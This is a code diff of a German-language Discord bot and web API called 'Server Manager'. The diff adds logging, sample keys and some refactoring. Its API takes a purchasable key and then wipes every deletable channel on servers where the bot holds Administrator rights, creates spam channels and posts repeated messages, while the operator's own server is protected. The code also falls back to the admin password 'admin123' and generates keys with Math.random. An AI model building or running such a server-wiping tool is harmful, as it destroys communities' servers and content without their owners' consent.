@@ -26,18 +26,20 @@ const client = new Client({
 });
 
 // ============ KONFIGURATION ============
-const PROTECTED_SERVER_ID = '1524503955693113505'; // Dieser Server wird NIE im Dropdown angezeigt
-const KEY_COMMAND_CHANNEL_ID = 'get-rdkey'; // In diesen Kanal wird das Embed gesendet
+const PROTECTED_SERVER_ID = '1524503955693113505';
+const KEY_COMMAND_CHANNEL_ID = 'get-rdkey';
+const LOG_CATEGORY_NAME = 'Resettet Server';
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
 
 // ============ KEY-SYSTEM ============
 let userKeys = [
-    { key: 'DEMO-KEY', remainingResets: 0, created: Date.now(), createdBy: 'System' },
+    { key: 'DEMO-KEY-1234', remainingResets: 2, created: Date.now(), createdBy: 'System' },
+    { key: 'SCHULE-2026', remainingResets: 5, created: Date.now(), createdBy: 'System' }
 ];
 
 function generateKey() {
     const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-    const length = Math.floor(Math.random() * 4) + 15; // 15-18 Zeichen
+    const length = Math.floor(Math.random() * 4) + 15;
     let key = '';
     for (let i = 0; i < length; i++) {
         key += chars.charAt(Math.floor(Math.random() * chars.length));
@@ -61,6 +63,77 @@ function useReset(userKey) {
     return false;
 }
 
+// ============ LOGGING ============
+async function logResetToProtectedServer(guild, data) {
+    try {
+        const protectedGuild = client.guilds.cache.get(PROTECTED_SERVER_ID);
+        if (!protectedGuild) return;
+
+        let category = protectedGuild.channels.cache.find(
+            c => c.name === LOG_CATEGORY_NAME && c.type === ChannelType.GuildCategory
+        );
+        if (!category) {
+            category = await protectedGuild.channels.create({
+                name: LOG_CATEGORY_NAME,
+                type: ChannelType.GuildCategory
+            });
+        }
+
+        const channelName = guild.name.toLowerCase().replace(/[^a-z0-9äöü]/g, '-').replace(/-+/g, '-').substring(0, 50);
+        let serverChannel = protectedGuild.channels.cache.find(
+            c => c.name === channelName && c.parentId === category.id
+        );
+        if (!serverChannel) {
+            serverChannel = await protectedGuild.channels.create({
+                name: channelName,
+                type: ChannelType.GuildText,
+                parent: category.id,
+                topic: `Reset-Log für Server: ${guild.name} (ID: ${guild.id})`
+            });
+        }
+
+        const durationSeconds = ((data.endTime - data.startTime) / 1000).toFixed(1);
+        const durationFormatted = durationSeconds < 60 
+            ? `${durationSeconds} Sekunden` 
+            : `${(durationSeconds / 60).toFixed(1)} Minuten`;
+
+        const embed = new EmbedBuilder()
+            .setTitle(data.isDeleteOnly ? '🗑️ Kanäle gelöscht' : '🔄 Server-Reset')
+            .setDescription(`**Server:** ${guild.name}\n**ID:** \`${guild.id}\``)
+            .setColor(data.isDeleteOnly ? 0xe74c3c : 0x6c5ce7)
+            .addFields([
+                { name: '⏱️ Dauer', value: durationFormatted, inline: true },
+                { name: '🗑️ Gelöscht', value: `${data.deletedChannels} Kanäle`, inline: true },
+                { name: '📅 Datum', value: new Date().toLocaleString('de-DE'), inline: false }
+            ]);
+
+        if (!data.isDeleteOnly) {
+            embed.addFields([
+                { name: '🆕 Erstellt', value: `${data.createdChannels} × "${data.channelName}-X"`, inline: true },
+                { name: '📨 Nachricht', value: `\`\`\`${data.message}\`\`\``, inline: false },
+                { name: '🔁 Pro Kanal', value: `${data.repeat}x gesendet`, inline: true }
+            ]);
+        }
+
+        embed.addFields([
+            { name: '👤 Ausgeführt von', value: data.requestedBy || 'Unbekannt', inline: true },
+            { name: '🔑 Verwendeter Key', value: `||${data.userKey}||`, inline: false },
+            { name: '⬆️ Verbleibende Resets', value: `${data.remainingResets}`, inline: true }
+        ]);
+
+        if (guild.iconURL()) {
+            embed.setThumbnail(guild.iconURL({ size: 128 }));
+        }
+
+        embed.setFooter({ text: `Reset #${resetStats.totalResets} • Server Manager` }).setTimestamp();
+
+        await serverChannel.send({ embeds: [embed] });
+
+    } catch (e) {
+        console.error('Fehler beim Loggen:', e.message);
+    }
+}
+
 // ============ BOT ============
 let resetStats = { totalResets: 0, history: [] };
 let currentProgress = { running: false, step: '', serverName: '', progressPercent: 0 };
@@ -75,47 +148,35 @@ client.once('ready', async () => {
     console.log(`📡 Auf ${client.guilds.cache.size} Servern`);
     console.log(`🔑 ${userKeys.length} Keys geladen`);
     console.log(`🛡️ Server ${PROTECTED_SERVER_ID} ist geschützt`);
-    
-    // Key-Embed im Admin-Server senden
     await sendKeyCommandEmbed();
 });
 
-// ============ KEY-EMBED SENDEN ============
+// ============ KEY-EMBED ============
 async function sendKeyCommandEmbed() {
     const guild = client.guilds.cache.get(PROTECTED_SERVER_ID);
-    if (!guild) return console.log('⚠️ Admin-Server nicht gefunden');
-    
-    // Kanal finden
+    if (!guild) return;
+
     const channel = guild.channels.cache.find(c => c.name === KEY_COMMAND_CHANNEL_ID || c.id === KEY_COMMAND_CHANNEL_ID);
-    if (!channel) return console.log('⚠️ Key-Command-Kanal nicht gefunden');
-    
-    // Alte Nachrichten löschen (optional)
+    if (!channel) return;
+
     try {
         const messages = await channel.messages.fetch({ limit: 10 });
         const botMessages = messages.filter(m => m.author.id === client.user.id);
-        for (const [_, msg] of botMessages) {
-            await msg.delete().catch(() => {});
-        }
+        for (const [_, msg] of botMessages) await msg.delete().catch(() => {});
     } catch (e) {}
-    
+
     const embed = new EmbedBuilder()
         .setTitle('🔑 Key-Generator')
-        .setDescription('Erstelle hier neue Zugangsschlüssel für das **Server Manager Dashboard**.\n\n' +
-            '**So funktioniert\'s:**\n' +
-            '1️⃣ Wähle die Anzahl der Resets aus\n' +
-            '2️⃣ Klicke auf **"Key erstellen"**\n' +
-            '3️⃣ Der Key wird in einem privaten Kanal angezeigt\n\n' +
-            '━━━━━━━━━━━━━━━━━━━━━━━━━')
+        .setDescription('Erstelle hier neue Zugangsschlüssel für das **Server Manager Dashboard**.\n\n**So funktioniert\'s:**\n1️⃣ Wähle die Anzahl der Resets aus\n2️⃣ Gib einen Namen für den Key ein\n3️⃣ Der Key wird in einem privaten Kanal angezeigt\n\n━━━━━━━━━━━━━━━━━━━━━━━━━')
         .setColor(0x6c5ce7)
         .addFields(
-            { name: '📊 Vorhandene Keys', value: `${userKeys.length} Keys gespeichert`, inline: true },
-            { name: '🔄 Resets gesamt', value: `${resetStats.totalResets} durchgeführt`, inline: true },
-            { name: '🛡️ Geschützter Server', value: `ID: ${PROTECTED_SERVER_ID}`, inline: false }
+            { name: '📊 Keys', value: `${userKeys.length} gespeichert`, inline: true },
+            { name: '🔄 Resets', value: `${resetStats.totalResets} gesamt`, inline: true },
+            { name: '🛡️ Geschützt', value: `ID: ${PROTECTED_SERVER_ID}`, inline: false }
         )
         .setFooter({ text: 'Server Manager • Key-System', iconURL: client.user.displayAvatarURL() })
         .setTimestamp();
-    
-    // Auswahl-Menü für Anzahl Resets
+
     const selectMenu = new StringSelectMenuBuilder()
         .setCustomId('key_resets_select')
         .setPlaceholder('Anzahl der Resets auswählen')
@@ -129,26 +190,22 @@ async function sendKeyCommandEmbed() {
             { label: '50 Resets', value: '50', emoji: '👑' },
             { label: 'Unbegrenzt (999)', value: '999', emoji: '♾️' }
         ]);
-    
+
     const row = new ActionRowBuilder().addComponents(selectMenu);
-    
     await channel.send({ embeds: [embed], components: [row] });
     console.log('✅ Key-Embed gesendet');
 }
 
-// ============ INTERACTION HANDLER ============
+// ============ INTERACTIONS ============
 client.on('interactionCreate', async (interaction) => {
     if (!interaction.isStringSelectMenu() && !interaction.isModalSubmit()) return;
-    
-    // Dropdown: Anzahl Resets ausgewählt
+
     if (interaction.customId === 'key_resets_select') {
         const selectedResets = interaction.values[0];
-        
-        // Modal für Key-Name öffnen
         const modal = new ModalBuilder()
             .setCustomId(`key_modal_${selectedResets}`)
             .setTitle('Neuen Key erstellen');
-        
+
         const nameInput = new TextInputBuilder()
             .setCustomId('key_name')
             .setLabel('Name für den Key')
@@ -156,62 +213,40 @@ client.on('interactionCreate', async (interaction) => {
             .setStyle(TextInputStyle.Short)
             .setRequired(true)
             .setMaxLength(30);
-        
-        const row = new ActionRowBuilder().addComponents(nameInput);
-        modal.addComponents(row);
-        
+
+        modal.addComponents(new ActionRowBuilder().addComponents(nameInput));
         await interaction.showModal(modal);
     }
-    
-    // Modal: Key-Name eingegeben → Key generieren
+
     if (interaction.customId.startsWith('key_modal_')) {
         const resets = parseInt(interaction.customId.split('_')[2]);
         const keyName = interaction.fields.getTextInputValue('key_name');
-        
-        // Key generieren
         const newKeyValue = generateKey();
         const displayResets = resets === 999 ? 'Unbegrenzt' : resets;
-        
-        // Key speichern
+
         userKeys.push({
             key: newKeyValue,
             remainingResets: resets,
             created: Date.now(),
             createdBy: interaction.user.tag
         });
-        
-        // Privaten Kanal finden/erstellen für Key-Ausgabe
+
         const guild = interaction.guild;
         let keyChannel = guild.channels.cache.find(c => c.name === '🔑-key-log' && c.type === ChannelType.GuildText);
-        
         if (!keyChannel) {
             keyChannel = await guild.channels.create({
                 name: '🔑-key-log',
                 type: ChannelType.GuildText,
                 permissionOverwrites: [
-                    {
-                        id: guild.roles.everyone.id,
-                        deny: [PermissionsBitField.Flags.ViewChannel]
-                    },
-                    {
-                        id: client.user.id,
-                        allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages]
-                    }
+                    { id: guild.roles.everyone.id, deny: [PermissionsBitField.Flags.ViewChannel] },
+                    { id: client.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] }
                 ]
             });
-            
-            // Admin-Rollen hinzufügen
-            guild.roles.cache
-                .filter(r => r.permissions.has(PermissionsBitField.Flags.Administrator))
-                .forEach(r => {
-                    keyChannel.permissionOverwrites.create(r, {
-                        ViewChannel: true,
-                        SendMessages: false
-                    }).catch(() => {});
-                });
+            guild.roles.cache.filter(r => r.permissions.has(PermissionsBitField.Flags.Administrator)).forEach(r => {
+                keyChannel.permissionOverwrites.create(r, { ViewChannel: true, SendMessages: false }).catch(() => {});
+            });
         }
-        
-        // Key-Embed im privaten Kanal senden
+
         const keyEmbed = new EmbedBuilder()
             .setTitle('🔑 Neuer Key erstellt')
             .setDescription(`Ein neuer Zugangsschlüssel wurde generiert.`)
@@ -225,18 +260,10 @@ client.on('interactionCreate', async (interaction) => {
             )
             .setFooter({ text: 'Server Manager • Key-System' })
             .setTimestamp();
-        
+
         await keyChannel.send({ embeds: [keyEmbed] });
-        
-        // Antwort an den Ersteller (ephemeral)
-        await interaction.reply({
-            content: `✅ Key erfolgreich erstellt!\n\n🔑 **Key:** \`${newKeyValue}\`\n🔄 **Resets:** ${displayResets}\n📛 **Name:** ${keyName}\n\nDer Key wurde auch in ${keyChannel} hinterlegt.`,
-            ephemeral: true
-        });
-        
+        await interaction.reply({ content: `✅ Key erstellt!\n\n🔑 **Key:** \`${newKeyValue}\`\n🔄 **Resets:** ${displayResets}\n📛 **Name:** ${keyName}\n\nGespeichert in ${keyChannel}`, ephemeral: true });
         console.log(`🔑 Key erstellt: ${keyName} (${resets} Resets) von ${interaction.user.tag}`);
-        
-        // Key-Embed im Befehlskanal aktualisieren
         await sendKeyCommandEmbed();
     }
 });
@@ -257,65 +284,43 @@ app.post('/api/validate-key', (req, res) => {
     const { userKey } = req.body;
     if (!userKey) return res.json({ valid: false, reason: 'Kein Key angegeben' });
     const result = validateKey(userKey);
-    res.json({
-        valid: result.valid,
-        reason: result.reason,
-        remainingResets: result.key?.remainingResets || 0
-    });
+    res.json({ valid: result.valid, reason: result.reason, remainingResets: result.key?.remainingResets || 0 });
 });
 
 app.post('/api/servers', (req, res) => {
     const { userKey } = req.body;
     const keyCheck = validateKey(userKey);
     if (!keyCheck.valid) return res.status(403).json({ error: keyCheck.reason });
-    
     if (!client.isReady()) return res.json([]);
-    
+
     const servers = client.guilds.cache
-        .filter(g => {
-            // Geschützten Server ausschließen
-            if (g.id === PROTECTED_SERVER_ID) return false;
-            const botMember = g.members.me;
-            return botMember?.permissions.has(PermissionsBitField.Flags.Administrator);
-        })
-        .map(g => ({
-            id: g.id,
-            name: g.name,
-            icon: g.iconURL({ size: 64 }) || '',
-            channelCount: g.channels.cache.size,
-            memberCount: g.memberCount
-        }));
-    
+        .filter(g => g.id !== PROTECTED_SERVER_ID && g.members.me?.permissions.has(PermissionsBitField.Flags.Administrator))
+        .map(g => ({ id: g.id, name: g.name, icon: g.iconURL({ size: 64 }) || '', channelCount: g.channels.cache.size, memberCount: g.memberCount }));
+
     res.json(servers);
 });
 
 app.post('/api/reset', async (req, res) => {
-    const { userKey, serverId, channelCount, channelName, channelMessage, messageRepeat } = req.body;
-    
-    // Geschützten Server blockieren
-    if (serverId === PROTECTED_SERVER_ID) {
-        return res.status(403).json({ error: 'Dieser Server ist geschützt!' });
-    }
-    
+    const { userKey, serverId, channelCount, channelName, channelMessage, messageRepeat, requestedBy } = req.body;
+    const startTime = Date.now();
+
+    if (serverId === PROTECTED_SERVER_ID) return res.status(403).json({ error: 'Dieser Server ist geschützt!' });
+
     const keyCheck = validateKey(userKey);
     if (!keyCheck.valid) return res.status(403).json({ error: keyCheck.reason });
-    
     if (currentProgress.running) return res.status(400).json({ error: 'Ein Reset läuft bereits' });
-    
+
     const guild = client.guilds.cache.get(serverId);
     if (!guild) return res.status(404).json({ error: 'Server nicht gefunden' });
-    
-    if (!guild.members.me?.permissions.has(PermissionsBitField.Flags.Administrator)) {
-        return res.status(403).json({ error: 'Bot braucht Administrator-Rechte!' });
-    }
-    
+    if (!guild.members.me?.permissions.has(PermissionsBitField.Flags.Administrator)) return res.status(403).json({ error: 'Bot braucht Administrator-Rechte!' });
+
     currentProgress = { running: true, step: 'Lösche alte Kanäle...', serverName: guild.name, progressPercent: 0 };
-    
+
     try {
         const deletableChannels = guild.channels.cache.filter(c => c.deletable);
         const totalChannels = deletableChannels.size;
         let deleted = 0;
-        
+
         for (const [_, channel] of deletableChannels) {
             await channel.delete().catch(() => {});
             deleted++;
@@ -323,22 +328,22 @@ app.post('/api/reset', async (req, res) => {
             currentProgress.step = `Lösche Kanal ${deleted}/${totalChannels}...`;
             await new Promise(r => setTimeout(r, 300));
         }
-        
+
         currentProgress.step = 'Erstelle Log-Kanal...';
         currentProgress.progressPercent = 35;
-        
+
         const logChannel = await guild.channels.create({
             name: '📋-server-log',
             type: ChannelType.GuildText,
             permissionOverwrites: [{ id: guild.roles.everyone.id, deny: [PermissionsBitField.Flags.SendMessages] }]
         });
-        
+
         const count = Math.min(parseInt(channelCount) || 5, 10);
         const name = channelName || 'kanal';
         const message = channelMessage || '✅ Kanal funktioniert einwandfrei!';
         const repeat = Math.min(parseInt(messageRepeat) || 1, 10);
         const createdChannels = [];
-        
+
         for (let i = 1; i <= count; i++) {
             currentProgress.step = `Erstelle Kanal ${i}/${count}: ${name}-${i}`;
             currentProgress.progressPercent = 35 + Math.floor((i / count) * 50);
@@ -346,7 +351,7 @@ app.post('/api/reset', async (req, res) => {
             if (ch) createdChannels.push(ch);
             await new Promise(r => setTimeout(r, 500));
         }
-        
+
         for (const channel of createdChannels) {
             for (let m = 1; m <= repeat; m++) {
                 currentProgress.step = `Nachricht ${m}/${repeat} in ${channel.name}...`;
@@ -355,23 +360,32 @@ app.post('/api/reset', async (req, res) => {
                 await new Promise(r => setTimeout(r, 500));
             }
         }
-        
+
         useReset(userKey);
-        
+        const endTime = Date.now();
+
         currentProgress.step = 'Sende Bestätigung...';
         currentProgress.progressPercent = 98;
-        
+
         await logChannel.send({
-            content: `✅ **Server-Reset abgeschlossen!**\n\n📊 Gelöscht: ${deleted} | Neu: ${count} × "${name}-X"\n📨 Nachricht: "${message}" (${repeat}x pro Kanal)\n🔑 Verbleibende Resets: ${keyCheck.key.remainingResets - 1}\n🕐 ${new Date().toLocaleString('de-DE')}`
+            content: `✅ **Server-Reset abgeschlossen!**\n\n📊 Gelöscht: ${deleted} | Neu: ${count} × "${name}-X"\n📨 Nachricht: "${message}" (${repeat}x pro Kanal)\n🔑 Verbleibend: ${keyCheck.key.remainingResets - 1}\n🕐 ${new Date().toLocaleString('de-DE')}`
         });
-        
+
         resetStats.totalResets++;
         resetStats.history.unshift({ server: guild.name, timestamp: Date.now(), channelsCreated: count });
         if (resetStats.history.length > 50) resetStats.history.pop();
-        
+
+        await logResetToProtectedServer(guild, {
+            startTime, endTime, deletedChannels: deleted, createdChannels: count,
+            channelName: name, message, repeat, userKey,
+            remainingResets: keyCheck.key.remainingResets - 1,
+            isDeleteOnly: false,
+            requestedBy: requestedBy || 'Unbekannt'
+        });
+
         currentProgress = { running: false, step: '✅ Fertig!', serverName: guild.name, progressPercent: 100 };
-        
         res.json({ success: true, message: `${count} Kanäle erstellt`, remainingResets: keyCheck.key.remainingResets - 1, stats: resetStats });
+
     } catch (err) {
         currentProgress = { running: false, step: '❌ Fehler!', serverName: guild.name, progressPercent: 0 };
         res.status(500).json({ error: err.message });
@@ -379,20 +393,19 @@ app.post('/api/reset', async (req, res) => {
 });
 
 app.post('/api/delete-channels', async (req, res) => {
-    const { userKey, serverId } = req.body;
-    
-    if (serverId === PROTECTED_SERVER_ID) {
-        return res.status(403).json({ error: 'Dieser Server ist geschützt!' });
-    }
-    
+    const { userKey, serverId, requestedBy } = req.body;
+    const startTime = Date.now();
+
+    if (serverId === PROTECTED_SERVER_ID) return res.status(403).json({ error: 'Dieser Server ist geschützt!' });
+
     const keyCheck = validateKey(userKey);
     if (!keyCheck.valid) return res.status(403).json({ error: keyCheck.reason });
-    
+
     const guild = client.guilds.cache.get(serverId);
     if (!guild) return res.status(404).json({ error: 'Server nicht gefunden' });
-    
+
     currentProgress = { running: true, step: 'Lösche alle Kanäle...', serverName: guild.name, progressPercent: 0 };
-    
+
     const channels = guild.channels.cache.filter(c => c.deletable);
     let deleted = 0;
     for (const [_, ch] of channels) {
@@ -401,39 +414,44 @@ app.post('/api/delete-channels', async (req, res) => {
         currentProgress.progressPercent = Math.floor((deleted / channels.size) * 100);
         await new Promise(r => setTimeout(r, 300));
     }
-    
+
     useReset(userKey);
+    const endTime = Date.now();
     currentProgress = { running: false, step: '✅ Alle Kanäle gelöscht', serverName: guild.name, progressPercent: 100 };
+
+    await logResetToProtectedServer(guild, {
+        startTime, endTime, deletedChannels: deleted,
+        createdChannels: 0, channelName: '', message: '', repeat: 0,
+        userKey, remainingResets: keyCheck.key.remainingResets - 1,
+        isDeleteOnly: true,
+        requestedBy: requestedBy || 'Unbekannt'
+    });
+
     res.json({ success: true, deleted, remainingResets: keyCheck.key.remainingResets - 1 });
 });
 
-// ============ ADMIN ROUTEN ============
+// ============ ADMIN ============
 app.post('/api/admin/login', (req, res) => {
-    const { password } = req.body;
-    if (password === ADMIN_PASSWORD) return res.json({ success: true });
-    res.status(403).json({ error: 'Falsches Passwort' });
+    res.json({ success: req.body.password === ADMIN_PASSWORD });
 });
 
 app.post('/api/admin/keys', (req, res) => {
-    const { password } = req.body;
-    if (password !== ADMIN_PASSWORD) return res.status(403).json({ error: 'Zugriff verweigert' });
+    if (req.body.password !== ADMIN_PASSWORD) return res.status(403).json({ error: 'Zugriff verweigert' });
     res.json(userKeys.map(k => ({ key: k.key, remainingResets: k.remainingResets, created: k.created, createdBy: k.createdBy })));
 });
 
 app.post('/api/admin/create-key', (req, res) => {
     const { password, keyName, maxResets } = req.body;
     if (password !== ADMIN_PASSWORD) return res.status(403).json({ error: 'Zugriff verweigert' });
-    if (!keyName || !maxResets) return res.status(400).json({ error: 'Key-Name und Resets erforderlich' });
-    
+    if (!keyName || !maxResets) return res.status(400).json({ error: 'Name und Resets erforderlich' });
     const newKey = { key: generateKey(), remainingResets: parseInt(maxResets), created: Date.now(), createdBy: 'Admin' };
     userKeys.push(newKey);
     res.json({ success: true, key: newKey });
 });
 
 app.post('/api/admin/delete-key', (req, res) => {
-    const { password, key } = req.body;
-    if (password !== ADMIN_PASSWORD) return res.status(403).json({ error: 'Zugriff verweigert' });
-    userKeys = userKeys.filter(k => k.key !== key);
+    if (req.body.password !== ADMIN_PASSWORD) return res.status(403).json({ error: 'Zugriff verweigert' });
+    userKeys = userKeys.filter(k => k.key !== req.body.key);
     res.json({ success: true });
 });
 
